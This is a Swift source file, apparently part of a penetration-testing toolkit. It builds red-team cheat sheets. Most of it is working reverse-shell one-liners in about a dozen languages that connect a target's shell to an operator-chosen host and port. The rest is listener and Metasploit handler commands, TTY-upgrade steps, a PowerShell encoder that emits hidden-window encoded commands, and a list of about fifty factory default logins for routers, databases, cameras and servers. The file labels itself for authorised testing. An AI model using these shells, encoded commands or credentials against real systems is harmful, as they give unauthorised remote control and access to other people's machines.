import Foundation

/// Red-team cheat-sheet generators: reverse shells, listeners, PowerShell encoding, default
/// credentials. These produce command strings for authorised engagements / CTFs — nothing executes.
public enum RedTeam {

    // MARK: Reverse shells

    public static func reverseShells(lhost: String, lport: Int) -> [(name: String, cmd: String)] {
        let h = lhost, p = lport
        return [
            ("Bash /dev/tcp", "bash -i >& /dev/tcp/\(h)/\(p) 0>&1"),
            ("Bash (read line)", "exec 5<>/dev/tcp/\(h)/\(p);cat <&5 | while read line; do $line 2>&5 >&5; done"),
            ("sh", "/bin/sh -i >& /dev/tcp/\(h)/\(p) 0>&1"),
            ("nc -e", "nc \(h) \(p) -e /bin/sh"),
            ("nc mkfifo", "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc \(h) \(p) >/tmp/f"),
            ("ncat --ssl", "ncat --ssl \(h) \(p) -e /bin/bash"),
            ("Python3", "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\(h)\",\(p)));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'"),
            ("PHP", "php -r '$sock=fsockopen(\"\(h)\",\(p));exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
            ("Perl", "perl -e 'use Socket;$i=\"\(h)\";$p=\(p);socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"),
            ("Ruby", "ruby -rsocket -e'f=TCPSocket.open(\"\(h)\",\(p)).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),
            ("PowerShell", "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('\(h)',\(p));$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}\""),
            ("socat", "socat TCP:\(h):\(p) EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane"),
            ("Go", "echo 'package main;import(\"net\";\"os/exec\";\"os\");func main(){c,_:=net.Dial(\"tcp\",\"\(h):\(p)\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go"),
            ("Lua", "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('\(h)','\(p)');os.execute('/bin/sh -i <&3 >&3 2>&3');\"")
        ]
    }

    public static func parseTarget(_ input: String) -> (String, Int)? {
        let t = input.trimmed().replacingOccurrences(of: " ", with: ":")
        let parts = t.split(separator: ":")
        guard parts.count >= 2, let port = Int(parts.last!), (1...65535).contains(port) else { return nil }
        let host = parts.dropLast().joined(separator: ":")
        return host.isEmpty ? nil : (host, port)
    }

    public static func runReverseShell(_ input: String) -> ToolOutput {
        guard let (h, p) = parseTarget(input) else {
            return ToolOutput(sections: [ReportSection("Reverse shell", items: [ReportItem("Usage", "LHOST:LPORT  (e.g. 10.10.14.3:4444)", .low)])])
        }
        var shells = ReportSection("Reverse shells → \(h):\(p)",
                                   note: "For authorised testing only. Start the listener first, then run one of these on the target.")
        for s in reverseShells(lhost: h, lport: p) { shells.add(s.name, s.cmd) }
        var listener = ReportSection("Listeners (run on \(h))")
        listener.add("Netcat", "nc -lvnp \(p)")
        listener.add("Ncat (TLS)", "ncat --ssl -lvnp \(p)")
        listener.add("socat (PTY)", "socat file:`tty`,raw,echo=0 TCP-LISTEN:\(p)")
        listener.add("Metasploit", "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST \(h); set LPORT \(p); run")
        var upgrade = ReportSection("TTY upgrade (after catching the shell)")
        upgrade.add("Python PTY", "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'")
        upgrade.add("Then", "Ctrl-Z ; stty raw -echo; fg ; export TERM=xterm")
        return ToolOutput(sections: [shells, listener, upgrade])
    }

    // MARK: PowerShell -EncodedCommand (UTF-16LE base64)

    public static func powershellEncode(_ command: String) -> String {
        let data = command.data(using: .utf16LittleEndian) ?? Data()
        return data.base64EncodedString()
    }

    public static func runPowerShellEncode(_ input: String) -> ToolOutput {
        let cmd = input.trimmed()
        guard !cmd.isEmpty else { return ToolOutput(sections: [ReportSection("PowerShell encoder", items: [ReportItem("Usage", "enter a PowerShell command to encode", .low)])]) }
        let enc = powershellEncode(cmd)
        var s = ReportSection("PowerShell -EncodedCommand", note: "UTF-16LE then Base64 — bypasses quoting/escaping on the command line.")
        s.add("Encoded", enc)
        s.add("Full command", "powershell -nop -w hidden -enc \(enc)")
        return ToolOutput(sections: [s])
    }

    // MARK: Default credentials

    public static let defaultCreds: [(product: String, user: String, pass: String)] = [
        ("Apache Tomcat", "tomcat", "tomcat"), ("Apache Tomcat", "admin", "admin"), ("Tomcat Manager", "tomcat", "s3cret"),
        ("MySQL", "root", "(blank)"), ("MariaDB", "root", "(blank)"), ("PostgreSQL", "postgres", "postgres"),
        ("MSSQL", "sa", "(blank)"), ("Oracle DB", "system", "manager"), ("Oracle DB", "sys", "change_on_install"),
        ("Oracle DB", "scott", "tiger"), ("MongoDB", "(none by default)", "(none)"), ("Redis", "(none by default)", "(none)"),
        ("Elasticsearch", "elastic", "changeme"), ("RabbitMQ", "guest", "guest"), ("Jenkins", "admin", "admin"),
        ("Grafana", "admin", "admin"), ("Kibana", "elastic", "changeme"), ("Portainer", "admin", "(set on first run)"),
        ("Zabbix", "Admin", "zabbix"), ("Nagios", "nagiosadmin", "nagios"), ("phpMyAdmin", "root", "(blank)"),
        ("Webmin", "admin", "(set on install)"), ("pfSense", "admin", "pfsense"), ("OpenWRT", "root", "(blank)"),
        ("Cisco IOS", "cisco", "cisco"), ("Cisco", "admin", "admin"), ("Juniper", "root", "(blank)"),
        ("Netgear", "admin", "password"), ("Linksys", "admin", "admin"), ("D-Link", "admin", "(blank)"),
        ("TP-Link", "admin", "admin"), ("Ubiquiti", "ubnt", "ubnt"), ("Huawei", "admin", "admin"),
        ("Raspberry Pi OS", "pi", "raspberry"), ("Kali Linux", "kali", "kali"), ("Metasploitable 2", "msfadmin", "msfadmin"),
        ("DVWA", "admin", "password"), ("WebLogic", "weblogic", "weblogic1"), ("JBoss", "admin", "admin"),
        ("Splunk", "admin", "changeme"), ("VNC", "(none)", "password"), ("SNMP", "(community)", "public / private"),
        ("FTP (anon)", "anonymous", "(any email)"), ("Axis IP Camera", "root", "pass"), ("Hikvision Camera", "admin", "12345"),
        ("Dahua Camera", "admin", "admin"), ("HP iLO", "Administrator", "(on label)"), ("Dell iDRAC", "root", "calvin"),
        ("printers (PJL/JetDirect)", "admin", "(blank)"), ("GitLab", "root", "(set on first login)"), ("Jupyter", "(token)", "(token in logs)")
    ]

    public static func lookupCreds(_ query: String) -> [(product: String, user: String, pass: String)] {
        let q = query.trimmed().lowercased()
        guard !q.isEmpty else { return defaultCreds }
        return defaultCreds.filter { $0.product.lowercased().contains(q) }
    }

    public static func runDefaultCreds(_ input: String) -> ToolOutput {
        let matches = lookupCreds(input)
        var s = ReportSection("Default credentials (\(matches.count))",
                              note: "Common factory/default logins. Only use against systems you are authorised to test.")
        if matches.isEmpty { s.add("Result", "no product matched “\(input.trimmed())” — try a shorter term", .low) }
        for m in matches.prefix(80) { s.add(m.product, "\(m.user) : \(m.pass)", .medium) }
        return ToolOutput(sections: [s])
    }
}
